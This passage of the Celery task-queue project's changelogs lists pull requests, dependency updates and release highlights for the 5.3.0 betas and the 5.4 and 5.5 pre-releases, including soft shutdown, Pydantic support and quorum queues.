  - remove extra = from test.txt by @auvipy in \#8179
  - Update sqs.txt kombu\[sqs\]\>=5.3.0b3 by @auvipy in \#8174
  - Added signal triggered before fork by @jaroslawporada in \#8177
  - Update documentation on SQLAlchemy by @max-muoto in \#8188
  - Deprecate pytz and use zoneinfo by @max-muoto in \#8159
  - Update dev.txt by @auvipy in \#8192
  - Update test.txt by @auvipy in \#8193
  - Update test-integration.txt by @auvipy in \#8194
  - Update zstd.txt by @auvipy in \#8195
  - Update s3.txt by @auvipy in \#8196
  - Update msgpack.txt by @auvipy in \#8199
  - Update solar.txt by @auvipy in \#8198
  - Add Semgrep to CI by @Nusnus in \#8201
  - Added semgrep to README.rst by @Nusnus in \#8202
  - Update django.txt by @auvipy in \#8197
  - Update redis.txt 4.3.6 by @auvipy in \#8161
  - start removing codecov from pypi by @auvipy in \#8206
  - Update test.txt dependencies by @auvipy in \#8205
  - Improved doc for: worker\_deduplicate\_successful\_tasks by @Nusnus in \#8209
  - Renamed revoked\_headers to revoked\_stamps by @Nusnus in \#8210
  - Ensure argument for map is JSON serializable by @candleindark in \#8229

## 5.3.0b2

  - release-date  
    2023-02-19 1:47 P.M GMT+2

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - BLM-2: Adding unit tests to chord clone by @Nusnus in \#7668
  - Fix unknown task error typo by @dcecile in \#7675
  - rename redis integration test class so that tests are executed by @wochinge in \#7684
  - Check certificate/private key type when loading them by @qrmt in \#7680
  - Added integration test\_chord\_header\_id\_duplicated\_on\_rabbitmq\_msg\_duplication() by @Nusnus in \#7692
  - New feature flag: allow\_error\_cb\_on\_chord\_header - allowing setting an error callback on chord header by @Nusnus in \#7712
  - Update README.rst sorting Python/Celery versions by @andrebr in \#7714
  - Fixed a bug where stamping a chord body would not use the correct stamping method by @Nusnus in \#7722
  - Fixed doc duplication typo for Signature.stamp() by @Nusnus in \#7725
  - Fix issue 7726: variable used in finally block may not be instantiated by @woutdenolf in \#7727
  - Fixed bug in chord stamping with another chord as a body + unit test by @Nusnus in \#7730
  - Use "describe\_table" not "create\_table" to check for existence of DynamoDB table by @maxfirman in \#7734
  - Enhancements for task\_allow\_error\_cb\_on\_chord\_header tests and docs by @Nusnus in \#7744
  - Improved custom stamping visitor documentation by @Nusnus in \#7745
  - Improved the coverage of test\_chord\_stamping\_body\_chord() by @Nusnus in \#7748
  - billiard \>= 3.6.3.0,\<5.0 for rpm by @auvipy in \#7764
  - Fixed memory leak with ETA tasks at connection error when worker\_cancel\_long\_running\_tasks\_on\_connection\_loss is enabled by @Nusnus in \#7771
  - Fixed bug where a chord with header of type tuple was not supported in the link\_error flow for task\_allow\_error\_cb\_on\_chord\_header flag by @Nusnus in \#7772
  - Scheduled weekly dependency update for week 38 by @pyup-bot in \#7767
  - recreate\_module: set spec to the new module by @skshetry in \#7773
  - Override integration test config using integration-tests-config.json by @thedrow in \#7778
  - Fixed error handling bugs due to upgrade to a newer version of billiard by @Nusnus in \#7781
  - Do not recommend using easy\_install anymore by @jugmac00 in \#7789
  - GitHub Workflows security hardening by @sashashura in \#7768
  - Update ambiguous acks\_late doc by @Zhong-z in \#7728
  - billiard \>=4.0.2,\<5.0 by @auvipy in \#7720
  - importlib\_metadata remove deprecated entry point interfaces by @woutdenolf in \#7785
  - Scheduled weekly dependency update for week 41 by @pyup-bot in \#7798
  - pyzmq\>=22.3.0 by @auvipy in \#7497
  - Remove amqp from the BACKEND\_ALISES list by @Kludex in \#7805
  - Replace print by logger.debug by @Kludex in \#7809
  - Ignore coverage on except ImportError by @Kludex in \#7812
  - Add mongodb dependencies to test.txt by @Kludex in \#7810
  - Fix grammar typos on the whole project by @Kludex in \#7815
  - Remove isatty wrapper function by @Kludex in \#7814
  - Remove unused variable \_range by @Kludex in \#7813
  - Add type annotation on concurrency/threads.py by @Kludex in \#7808
  - Fix linter workflow by @Kludex in \#7816
  - Scheduled weekly dependency update for week 42 by @pyup-bot in \#7821
  - Remove .cookiecutterrc by @Kludex in \#7830
  - Remove .coveragerc file by @Kludex in \#7826
  - kombu\>=5.3.0b2 by @auvipy in \#7834
  - Fix readthedocs build failure by @woutdenolf in \#7835
  - Fixed bug in group, chord, chain stamp() method, where the visitor overrides the previously stamps in tasks of these objects by @Nusnus in \#7825
  - Stabilized test\_mutable\_errback\_called\_by\_chord\_from\_group\_fail\_multiple by @Nusnus in \#7837
  - Use SPDX license expression in project metadata by @RazerM in \#7845
  - New control command revoke\_by\_stamped\_headers by @Nusnus in \#7838
  - Clarify wording in Redis priority docs by @strugee in \#7853
  - Fix non working example of using celery\_worker pytest fixture by @paradox-lab in \#7857
  - Removed the mandatory requirement to include stamped\_headers key when implementing on\_signature() by @Nusnus in \#7856
  - Update serializer docs by @sondrelg in \#7858
  - Remove reference to old Python version by @Kludex in \#7829
  - Added on\_replace() to Task to allow manipulating the replaced sig with custom changes at the end of the task.replace() by @Nusnus in \#7860
  - Add clarifying information to completed\_count documentation by @hankehly in \#7873
  - Stabilized test\_revoked\_by\_headers\_complex\_canvas by @Nusnus in \#7877
  - StampingVisitor will visit the callbacks and errbacks of the signature by @Nusnus in \#7867
  - Fix "rm: no operand" error in clean-pyc script by @hankehly in \#7878
  - Add --skip-checks flag to bypass django core checks by @mudetz in \#7859
  - Scheduled weekly dependency update for week 44 by @pyup-bot in \#7868
  - Added two new unit tests to callback stamping by @Nusnus in \#7882
  - Sphinx extension: use inspect.signature to make it Python 3.11 compatible by @mathiasertl in \#7879
  - cryptography==38.0.3 by @auvipy in \#7886
  - Canvas.py doc enhancement by @Nusnus in \#7889
  - Fix typo by @sondrelg in \#7890
  - fix typos in optional tests by @hsk17 in \#7876
  - Canvas.py doc enhancement by @Nusnus in \#7891
  - Fix revoke by headers tests stability by @Nusnus in \#7892
  - feat: add global keyprefix for backend result keys by @kaustavb12 in \#7620
  - Canvas.py doc enhancement by @Nusnus in \#7897
  - fix(sec): upgrade sqlalchemy to 1.2.18 by @chncaption in \#7899
  - Canvas.py doc enhancement by @Nusnus in \#7902
  - Fix test warnings by @ShaheedHaque in \#7906
  - Support for out-of-tree worker pool implementations by @ShaheedHaque in \#7880
  - Canvas.py doc enhancement by @Nusnus in \#7907
  - Use bound task in base task example. Closes \#7909 by @WilliamDEdwards in \#7910
  - Allow the stamping visitor itself to set the stamp value type instead of casting it to a list by @Nusnus in \#7914
  - Stamping a task left the task properties dirty by @Nusnus in \#7916
  - Fixed bug when chaining a chord with a group by @Nusnus in \#7919
  - Fixed bug in the stamping visitor mechanism where the request was lacking the stamps in the 'stamps' property by @Nusnus in \#7928
  - Fixed bug in task\_accepted() where the request was not added to the requests but only to the active\_requests by @Nusnus in \#7929
  - Fix bug in TraceInfo.\_log\_error() where the real exception obj was hiding behind 'ExceptionWithTraceback' by @Nusnus in \#7930
  - Added integration test: test\_all\_tasks\_of\_canvas\_are\_stamped() by @Nusnus in \#7931
  - Added new example for the stamping mechanism: examples/stamping by @Nusnus in \#7933
  - Fixed a bug where replacing a stamped task and stamping it again by @Nusnus in \#7934
  - Bugfix for nested group stamping on task replace by @Nusnus in \#7935
  - Added integration test test\_stamping\_example\_canvas() by @Nusnus in \#7937
  - Fixed a bug in losing chain links when unchaining an inner chain with links by @Nusnus in \#7938
  - Removing as not mandatory by @auvipy in \#7885
  - Housekeeping for Canvas.py by @Nusnus in \#7942
  - Scheduled weekly dependency update for week 50 by @pyup-bot in \#7954
  - try pypy 3.9 in CI by @auvipy in \#7956
  - sqlalchemy==1.4.45 by @auvipy in \#7943
  - billiard\>=4.1.0,\<5.0 by @auvipy in \#7957
  - feat(typecheck): allow changing type check behavior on the app level; by @moaddib666 in \#7952
  - Add broker\_channel\_error\_retry option by @nkns165 in \#7951
  - Add beat\_cron\_starting\_deadline\_seconds to prevent unwanted cron runs by @abs25 in \#7945
  - Scheduled weekly dependency update for week 51 by @pyup-bot in \#7965
  - Added doc to "retry\_errors" newly supported field of "publish\_retry\_policy" of the task namespace by @Nusnus in \#7967
  - Renamed from master to main in the docs and the CI workflows by @Nusnus in \#7968
  - Fix docs for the exchange to use with worker\_direct by @alessio-b2c2 in \#7973
  - Pin redis==4.3.4 by @auvipy in \#7974
  - return list of nodes to make sphinx extension compatible with Sphinx 6.0 by @mathiasertl in \#7978
  - use version range redis\>=4.2.2,\<4.4.0 by @auvipy in \#7980
  - Scheduled weekly dependency update for week 01 by @pyup-bot in \#7987
  - Add annotations to minimise differences with celery-aio-pool's tracer.py. by @ShaheedHaque in \#7925
  - Fixed bug where linking a stamped task did not add the stamp to the link's options by @Nusnus in \#7992
  - sqlalchemy==1.4.46 by @auvipy in \#7995
  - pytz by @auvipy in \#8002
  - Fix few typos, provide configuration + workflow for codespell to catch any new by @yarikoptic in \#8023
  - RabbitMQ links update by @arnisjuraga in \#8031
  - Ignore files generated by tests by @Kludex in \#7846
  - Revert "sqlalchemy==1.4.46 (\#7995)" by @Nusnus in \#8033
  - Fixed bug with replacing a stamped task with a chain or a group (inc. links/errlinks) by @Nusnus in \#8034
  - Fixed formatting in setup.cfg that caused flake8 to misbehave by @Nusnus in \#8044
  - Removed duplicated import Iterable by @Nusnus in \#8046
  - Fix docs by @Nusnus in \#8047
  - Document --logfile default by @strugee in \#8057
  - Stamping Mechanism Refactoring by @Nusnus in \#8045
  - result\_backend\_thread\_safe config shares backend across threads by @CharlieTruong in \#8058
  - Fix cronjob that use day of month and negative UTC timezone by @pkyosx in \#8053
  - Stamping Mechanism Examples Refactoring by @Nusnus in \#8060
  - Fixed bug in Task.on\_stamp\_replaced() by @Nusnus in \#8061
  - Stamping Mechanism Refactoring 2 by @Nusnus in \#8064
  - Changed default append\_stamps from True to False (meaning duplicates … by @Nusnus in \#8068
  - typo in comment: mailicious =\> malicious by @yanick in \#8072
  - Fix command for starting flower with specified broker URL by @ShukantPal in \#8071
  - Improve documentation on ETA/countdown tasks (\#8069) by @norbertcyran in \#8075

## 5.3.0b1

  - release-date  
    2022-08-01 5:15 P.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Canvas Header Stamping (\#7384).
  - async chords should pass it's kwargs to the group/body.
  - beat: Suppress banner output with the quiet option (\#7608).
  - Fix honor Django's TIME\_ZONE setting.
  - Don't warn about DEBUG=True for Django.
  - Fixed the on\_after\_finalize cannot access tasks due to deadlock.
  - Bump kombu\>=5.3.0b1,\<6.0.
  - Make default worker state limits configurable (\#7609).
  - Only clear the cache if there are no active writers.
  - Billiard 4.0.1

## 5.3.0a1

  - release-date  
    2022-06-29 5:15 P.M UTC+6:00

  - release-by  
    Asif Saif Uddin

<!-- end list -->

  - Remove Python 3.4 compatibility code.
  - call ping to set connection attr for avoiding redis parse\_response error.
  - Use importlib instead of deprecated pkg\_resources.
  - fix \#7245 uid duplicated in command params.
  - Fix subscribed\_to maybe empty (\#7232).
  - Fix: Celery beat sleeps 300 seconds sometimes even when it should run a task within a few seconds (e.g. 13 seconds) \#7290.
  - Add security\_key\_password option (\#7292).
  - Limit elasticsearch support to below version 8.0.
  - try new major release of pytest 7 (\#7330).
  - broker\_connection\_retry should no longer apply on startup (\#7300).
  - Remove \_\_ne\_\_ methods (\#7257).
  - fix \#7200 uid and gid.
  - Remove exception-throwing from the signal handler.
  - Add mypy to the pipeline (\#7383).
  - Expose more debugging information when receiving unknown tasks. (\#7405)
  - Avoid importing buf\_t from billiard's compat module as it was removed.
  - Avoid negating a constant in a loop. (\#7443)
  - Ensure expiration is of float type when migrating tasks (\#7385).
  - load\_extension\_class\_names - correct module\_name (\#7406)
  - Bump pymongo\[srv\]\>=4.0.2.
  - Use inspect.getgeneratorstate in asynpool.gen\_not\_started (\#7476).
  - Fix test with missing .get() (\#7479).
  - azure-storage-blob\>=12.11.0
  - Make start\_worker, setup\_default\_app reusable outside of pytest.
  - Ensure a proper error message is raised when id for key is empty (\#7447).
  - Crontab string representation does not match UNIX crontab expression.
  - Worker should exit with ctx.exit to get the right exitcode for non-zero.
  - Fix expiration check (\#7552).
  - Use callable built-in.
  - Include dont\_autoretry\_for option in tasks. (\#7556)
  - fix: Syntax error in arango query.
  - Fix custom headers propagation on task retries (\#7555).
  - Silence backend warning when eager results are stored.
  - Reduce prefetch count on restart and gradually restore it (\#7350).
  - Improve workflow primitive subclassing (\#7593).
  - test kombu\>=5.3.0a1,\<6.0 (\#7598).
  - Canvas Header Stamping (\#7384).

---

changelog-5.4.md

---

# Change history

This document contains change notes for bugfix & new features in the & 5.4.x series, please see \[whatsnew-5.4\](\#whatsnew-5.4) for an overview of what's new in Celery 5.4.

## 5.4.0

  - release-date  
    2024-04-17

  - release-by  
    Tomer Nosrati

Celery v5.4.0 and v5.3.x have consistently focused on enhancing the overall QA, both internally and externally. This effort led to the new pytest-celery v1.0.0 release, developed concurrently with v5.3.0 & v5.4.0.

This release introduces two significant QA enhancements:

  - **Smoke Tests**: A new layer of automatic tests has been added to Celery's standard CI. These tests are designed to handle production scenarios and complex conditions efficiently. While new contributions will not be halted due to the lack of smoke tests, we will request smoke tests for advanced changes where appropriate.
  - [Standalone Bug Report Script](https://docs.celeryq.dev/projects/pytest-celery/en/latest/userguide/celery-bug-report.html): The new pytest-celery plugin now allows for encapsulating a complete Celery dockerized setup within a single pytest script. Incorporating these into new bug reports will enable us to reproduce reported bugs deterministically, potentially speeding up the resolution process.

Contrary to the positive developments above, there have been numerous reports about issues with the Redis broker malfunctioning upon restarts and disconnections. Our initial attempts to resolve this were not successful (\#8796). With our enhanced QA capabilities, we are now prepared to address the core issue with Redis (as a broker) again.

The rest of the changes for this release are grouped below, with the changes from the latest release candidate listed at the end.

### Changes

  - Add a Task class specialised for Django (\#8491)
  - Add Google Cloud Storage (GCS) backend (\#8868)
  - Added documentation to the smoke tests infra (\#8970)
  - Added a checklist item for using pytest-celery in a bug report (\#8971)
  - Bugfix: Missing id on chain (\#8798)
  - Bugfix: Worker not consuming tasks after Redis broker restart (\#8796)
  - Catch UnicodeDecodeError when opening corrupt beat-schedule.db (\#8806)
  - chore(ci): Enhance CI with <span class="title-ref">workflow\_dispatch</span> for targeted debugging and testing (\#8826)
  - Doc: Enhance "Testing with Celery" section (\#8955)
  - Docfix: pip install celery\[sqs\] -\> pip install "celery\[sqs\]" (\#8829)
  - Enable efficient <span class="title-ref">chord</span> when using dynamicdb as backend store (\#8783)
  - feat(daemon): allows daemonization options to be fetched from app settings (\#8553)
  - Fix DeprecationWarning: datetime.datetime.utcnow() (\#8726)
  - Fix recursive result parents on group in middle of chain (\#8903)
  - Fix typos and grammar (\#8915)
  - Fixed version documentation tag from \#8553 in configuration.rst (\#8802)
  - Hotfix: Smoke tests didn't allow customizing the worker's command arguments, now it does (\#8937)
  - Make custom remote control commands available in CLI (\#8489)
  - Print safe\_say() to stdout for non-error flows (\#8919)
  - Support moto 5.0 (\#8838)
  - Update contributing guide to use ssh upstream url (\#8881)
  - Update optimizing.rst (\#8945)
  - Updated concurrency docs page. (\#8753)

### Dependencies Updates

  - Bump actions/setup-python from 4 to 5 (\#8701)
  - Bump codecov/codecov-action from 3 to 4 (\#8831)
  - Bump isort from 5.12.0 to 5.13.2 (\#8772)
  - Bump msgpack from 1.0.7 to 1.0.8 (\#8885)
  - Bump mypy from 1.8.0 to 1.9.0 (\#8898)
  - Bump pre-commit to 3.6.1 (\#8839)
  - Bump pre-commit/action from 3.0.0 to 3.0.1 (\#8835)
  - Bump pytest from 8.0.2 to 8.1.1 (\#8901)
  - Bump pytest-celery to v1.0.0 (\#8962)
  - Bump pytest-cov to 5.0.0 (\#8924)
  - Bump pytest-order from 1.2.0 to 1.2.1 (\#8941)
  - Bump pytest-subtests from 0.11.0 to 0.12.1 (\#8896)
  - Bump pytest-timeout from 2.2.0 to 2.3.1 (\#8894)
  - Bump python-memcached from 1.59 to 1.61 (\#8776)
  - Bump sphinx-click from 4.4.0 to 5.1.0 (\#8774)
  - Update cryptography to 42.0.5 (\#8869)
  - Update elastic-transport requirement from \<=8.12.0 to \<=8.13.0 (\#8933)
  - Update elasticsearch requirement from \<=8.12.1 to \<=8.13.0 (\#8934)
  - Upgraded Sphinx from v5.3.0 to v7.x.x (\#8803)

### Changes since 5.4.0rc2

  - Update elastic-transport requirement from \<=8.12.0 to \<=8.13.0 (\#8933)
  - Update elasticsearch requirement from \<=8.12.1 to \<=8.13.0 (\#8934)
  - Hotfix: Smoke tests didn't allow customizing the worker's command arguments, now it does (\#8937)
  - Bump pytest-celery to 1.0.0rc3 (\#8946)
  - Update optimizing.rst (\#8945)
  - Doc: Enhance "Testing with Celery" section (\#8955)
  - Bump pytest-celery to v1.0.0 (\#8962)
  - Bump pytest-order from 1.2.0 to 1.2.1 (\#8941)
  - Added documentation to the smoke tests infra (\#8970)
  - Added a checklist item for using pytest-celery in a bug report (\#8971)
  - Added changelog for v5.4.0 (\#8973)
  - Bump version: 5.4.0rc2 → 5.4.0 (\#8974)

## 5.4.0rc2

  - release-date  
    2024-03-27

  - release-by  
    Tomer Nosrati

<!-- end list -->

  - feat(daemon): allows daemonization options to be fetched from app settings (\#8553)
  - Fixed version documentation tag from \#8553 in configuration.rst (\#8802)
  - Upgraded Sphinx from v5.3.0 to v7.x.x (\#8803)
  - Update elasticsearch requirement from \<=8.11.1 to \<=8.12.0 (\#8810)
  - Update elastic-transport requirement from \<=8.11.0 to \<=8.12.0 (\#8811)
  - Update cryptography to 42.0.0 (\#8814)
  - Catch UnicodeDecodeError when opening corrupt beat-schedule.db (\#8806)
  - Update cryptography to 42.0.1 (\#8817)
  - Limit moto to \<5.0.0 until the breaking issues are fixed (\#8820)
  - Enable efficient <span class="title-ref">chord</span> when using dynamicdb as backend store (\#8783)
  - Add a Task class specialised for Django (\#8491)
  - Sync kombu versions in requirements and setup.cfg (\#8825)
  - chore(ci): Enhance CI with <span class="title-ref">workflow\_dispatch</span> for targeted debugging and testing (\#8826)
  - Update cryptography to 42.0.2 (\#8827)
  - Docfix: pip install celery\[sqs\] -\> pip install "celery\[sqs\]" (\#8829)
  - Bump pre-commit/action from 3.0.0 to 3.0.1 (\#8835)
  - Support moto 5.0 (\#8838)
  - Another fix for <span class="title-ref">link\_error</span> signatures being <span class="title-ref">dict\`s instead of \`Signature</span> s (\#8841)
  - Bump codecov/codecov-action from 3 to 4 (\#8831)
  - Upgrade from pytest-celery v1.0.0b1 -\> v1.0.0b2 (\#8843)
  - Bump pytest from 7.4.4 to 8.0.0 (\#8823)
  - Update pre-commit to 3.6.1 (\#8839)
  - Update cryptography to 42.0.3 (\#8854)
  - Bump pytest from 8.0.0 to 8.0.1 (\#8855)
  - Update cryptography to 42.0.4 (\#8864)
  - Update pytest to 8.0.2 (\#8870)
  - Update cryptography to 42.0.5 (\#8869)
  - Update elasticsearch requirement from \<=8.12.0 to \<=8.12.1 (\#8867)
  - Eliminate consecutive chords generated by group | task upgrade (\#8663)
  - Make custom remote control commands available in CLI (\#8489)
  - Add Google Cloud Storage (GCS) backend (\#8868)
  - Bump msgpack from 1.0.7 to 1.0.8 (\#8885)
  - Update pytest to 8.1.0 (\#8886)
  - Bump pytest-timeout from 2.2.0 to 2.3.1 (\#8894)
  - Bump pytest-subtests from 0.11.0 to 0.12.1 (\#8896)
  - Bump mypy from 1.8.0 to 1.9.0 (\#8898)
  - Update pytest to 8.1.1 (\#8901)
  - Update contributing guide to use ssh upstream url (\#8881)
  - Fix recursive result parents on group in middle of chain (\#8903)
  - Bump pytest-celery to 1.0.0b4 (\#8899)
  - Adjusted smoke tests CI time limit (\#8907)
  - Update pytest-rerunfailures to 14.0 (\#8910)
  - Use the "all" extra for pytest-celery (\#8911)
  - Fix typos and grammar (\#8915)
  - Bump pytest-celery to 1.0.0rc1 (\#8918)
  - Print safe\_say() to stdout for non-error flows (\#8919)
  - Update pytest-cov to 5.0.0 (\#8924)
  - Bump pytest-celery to 1.0.0rc2 (\#8928)

## 5.4.0rc1

  - release-date  
    2024-01-17 7:00 P.M GMT+2

  - release-by  
    Tomer Nosrati

Celery v5.4 continues our effort to provide improved stability in production environments. The release candidate version is available for testing. The official release is planned for March-April 2024.

  - New Config: worker\_enable\_prefetch\_count\_reduction (\#8581)
  - Added "Serverless" section to Redis doc (redis.rst) (\#8640)
  - Upstash's Celery example repo link fix (\#8665)
  - Update mypy version (\#8679)
  - Update cryptography dependency to 41.0.7 (\#8690)
  - Add type annotations to celery/utils/nodenames.py (\#8667)
  - Issue 3426. Adding myself to the contributors. (\#8696)
  - Bump actions/setup-python from 4 to 5 (\#8701)
  - Fixed bug where chord.link\_error() throws an exception on a dict type errback object (\#8702)
  - Bump github/codeql-action from 2 to 3 (\#8725)
  - Fixed multiprocessing integration tests not running on Mac (\#8727)
  - Added make docker-docs (\#8729)
  - Fix DeprecationWarning: datetime.datetime.utcnow() (\#8726)
  - Remove <span class="title-ref">new</span> adjective in docs (\#8743)
  - add type annotation to celery/utils/sysinfo.py (\#8747)
  - add type annotation to celery/utils/iso8601.py (\#8750)
  - Change type annotation to celery/utils/iso8601.py (\#8752)
  - Update test deps (\#8754)
  - Mark flaky: test\_asyncresult\_get\_cancels\_subscription() (\#8757)
  - change \_read\_as\_base64 (b64encode returns bytes) on celery/utils/term.py (\#8759)
  - Replace string concatenation with fstring on celery/utils/term.py (\#8760)
  - Add type annotation to celery/utils/term.py (\#8755)
  - Skipping test\_tasks::test\_task\_accepted (\#8761)
  - Updated concurrency docs page. (\#8753)
  - Changed pyup -\> dependabot for updating dependencies (\#8764)
  - Bump isort from 5.12.0 to 5.13.2 (\#8772)
  - Update elasticsearch requirement from \<=8.11.0 to \<=8.11.1 (\#8775)
  - Bump sphinx-click from 4.4.0 to 5.1.0 (\#8774)
  - Bump python-memcached from 1.59 to 1.61 (\#8776)
  - Update elastic-transport requirement from \<=8.10.0 to \<=8.11.0 (\#8780)
  - python-memcached==1.61 -\> python-memcached\>=1.61 (\#8787)
  - Remove usage of utcnow (\#8791)
  - Smoke Tests (\#8793)
  - Moved smoke tests to their own workflow (\#8797)
  - Bugfix: Worker not consuming tasks after Redis broker restart (\#8796)
  - Bugfix: Missing id on chain (\#8798)

---

changelog-5.5.md

---

# Change history

This document contains change notes for bugfix & new features in the main branch & 5.5.x series, please see \[whatsnew-5.5\](\#whatsnew-5.5) for an overview of what's new in Celery 5.5.

## 5.5.0rc1

  - release-date  
    2024-10-08

  - release-by  
    Tomer Nosrati

Celery v5.5.0 Release Candidate 1 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

See \[whatsnew-5.5\](\#whatsnew-5.5) or read main highlights below.

#### Python 3.13 Initial Support

This release introduces the initial support for Python 3.13 with Celery.

After upgrading to this version, please share your feedback on the Python 3.13 support.

#### Soft Shutdown

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited "warm shutdown" period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option `worker_soft_shutdown_timeout`. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option `worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like \[Redis \<broker-redis\>\](\#redis-\<broker-redis\>) or \[SQS \<broker-sqs\>\](\#sqs-\<broker-sqs\>), to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., `Restoring 1 unacknowledged message(s)`) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues: [\#9213](https://github.com/celery/celery/pull/9213), [\#9231](https://github.com/celery/celery/pull/9231), [\#9238](https://github.com/celery/celery/pull/9238)

  - New \[documentation \<worker-stopping\>\](\#documentation-\<worker-stopping\>) for each shutdown type.
  - New `worker_soft_shutdown_timeout` configuration option.
  - New `worker_enable_soft_shutdown_on_idle` configuration option.

#### REMAP\_SIGTERM

The `REMAP_SIGTERM` "hidden feature" has been tested, \[documented \<worker-REMAP\_SIGTERM\>\](\#documented-\<worker-remap\_sigterm\>) and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using `TERM` instead of `QUIT`.

#### Pydantic Support

This release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR [\#9023](https://github.com/celery/celery/pull/9023) by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

  - `task_default_queue_type`
  - `worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What's Changed

  - Added Blacksmith.sh to the Sponsors section in the README (\#9323)
  - Revert "Added Blacksmith.sh to the Sponsors section in the README" (\#9324)
  - Added Blacksmith.sh to the Sponsors section in the README (\#9325)
  - Added missing " ” in README (\#9326)
  - Use Blacksmith SVG logo (\#9327)
  - Updated Blacksmith SVG logo (\#9328)
  - Revert "Updated Blacksmith SVG logo" (\#9329)
  - Update pymongo to 4.10.0 (\#9330)
  - Update pymongo to 4.10.1 (\#9332)
  - Update user guide to recommend delay\_on\_commit (\#9333)
  - Pin pre-commit to latest version 4.0.0 (Python 3.9+) (\#9334)
  - Update ephem to 4.1.6 (\#9336)
  - Updated Blacksmith SVG logo (\#9337)
  - Prepare for (pre) release: v5.5.0rc1 (\#9341)

## 5.5.0b4

  - release-date  
    2024-09-30

  - release-by  
    Tomer Nosrati

Celery v5.5.0 Beta 4 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

#### Python 3.13 Initial Support

This release introduces the initial support for Python 3.13 with Celery.

After upgrading to this version, please share your feedback on the Python 3.13 support.

### Previous Pre-release Highlights

#### Soft Shutdown

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited "warm shutdown" period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option `worker_soft_shutdown_timeout`. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option `worker_enable_soft_shutdown_on_idle` is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like \[Redis \<broker-redis\>\](\#redis-\<broker-redis\>) or \[SQS \<broker-sqs\>\](\#sqs-\<broker-sqs\>), to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., `Restoring 1 unacknowledged message(s)`) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues: [\#9213](https://github.com/celery/celery/pull/9213), [\#9231](https://github.com/celery/celery/pull/9231), [\#9238](https://github.com/celery/celery/pull/9238)

  - New \[documentation \<worker-stopping\>\](\#documentation-\<worker-stopping\>) for each shutdown type.
  - New `worker_soft_shutdown_timeout` configuration option.
  - New `worker_enable_soft_shutdown_on_idle` configuration option.

#### REMAP\_SIGTERM

The `REMAP_SIGTERM` "hidden feature" has been tested, \[documented \<worker-REMAP\_SIGTERM\>\](\#documented-\<worker-remap\_sigterm\>) and is now officially supported. This feature allows users to remap the SIGTERM signal to SIGQUIT, to initiate a soft or a cold shutdown using `TERM` instead of `QUIT`.

#### Pydantic Support

This release introduces support for Pydantic models in Celery tasks. For more info, see the new pydantic example and PR [\#9023](https://github.com/celery/celery/pull/9023) by @mathiasertl.

After upgrading to this version, please share your feedback on the new Pydantic support.

#### Redis Broker Stability Improvements

The root cause of the Redis broker instability issue has been [identified and resolved](https://github.com/celery/kombu/pull/2007) in the v5.4.0 release of Kombu, which should resolve the disconnections bug and offer additional improvements.

After upgrading to this version, please share your feedback on the Redis broker stability.

Relevant Issues: [\#7276](https://github.com/celery/celery/discussions/7276), [\#8091](https://github.com/celery/celery/discussions/8091), [\#8030](https://github.com/celery/celery/discussions/8030), [\#8384](https://github.com/celery/celery/discussions/8384)

#### Quorum Queues Initial Support

This release introduces the initial support for Quorum Queues with Celery.

See new configuration options for more details:

  - `task_default_queue_type`
  - `worker_detect_quorum_queues`

After upgrading to this version, please share your feedback on the Quorum Queues support.

Relevant Issues: [\#6067](https://github.com/celery/celery/discussions/6067), [\#9121](https://github.com/celery/celery/discussions/9121)

### What's Changed

  - Correct the error description in exception message when validate soft\_time\_limit (\#9246)
  - Update msgpack to 1.1.0 (\#9249)
  - chore(utils/time.py): rename <span class="title-ref">\_is\_ambigious</span> -\> <span class="title-ref">\_is\_ambiguous</span> (\#9248)
  - Reduced Smoke Tests to min/max supported python (3.8/3.12) (\#9252)
  - Update pytest to 8.3.3 (\#9253)
  - Update elasticsearch requirement from \<=8.15.0 to \<=8.15.1 (\#9255)
  - Update mongodb without deprecated <span class="title-ref">\[srv\]</span> extra requirement (\#9258)
  - blacksmith.sh: Migrate workflows to Blacksmith (\#9261)
